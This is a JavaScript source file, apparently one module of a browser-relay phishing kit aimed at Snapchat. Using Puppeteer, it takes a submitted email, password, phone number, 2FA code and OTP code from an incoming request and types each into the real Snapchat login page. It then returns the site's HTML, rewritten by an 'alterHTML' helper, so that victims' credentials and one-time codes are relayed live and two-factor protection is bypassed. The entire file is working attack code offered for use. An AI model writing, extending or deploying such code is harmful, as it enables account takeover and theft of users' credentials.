const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Snapchat extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]

        try {
            if (spikeType == "email") {
                let email = "#accountIdentifier"
                await page.waitForSelector(email)
                await page.evaluate(() => {
                    document.querySelector("#accountIdentifier").value = ""
                })
                await page.type(email, body.accountIdentifier)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else if (spikeType == "password") {
                let password = "#password"
                await page.waitForSelector(password)
                await page.evaluate(() => {
                    document.querySelector("#password").value = ""
                })
                await page.type(password, body.password)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "otp_code") {
                let sel = "#twoFAChallengeAnswer"
                await page.waitForSelector(sel)
                await page.type(sel, body.twoFAChallengeAnswer)
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "phone_number") {
                let phone_numberBtn = ".additional-action"
                await page.waitForSelector(phone_numberBtn)

                await page.click(phone_numberBtn)
                await new Promise(re => setTimeout(re, 1000))

            } else if (spikeType == "phone") {
                let phoneN = "#accountIdentifierPhoneNumber"
                let code = "#accountIdentifierCountryCode"
                await page.waitForSelector(phoneN)
                await page.waitForSelector(code)

                await page.select(code, body.accountIdentifierCountryCode)
                await page.type(phoneN, body.accountIdentifierPhoneNumber)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "otp_code_1") {
                let sel = "#otpChallengeAnswer"
                await page.waitForSelector(sel)
                await page.type(sel, body.otpChallengeAnswer)
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Snapchat(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}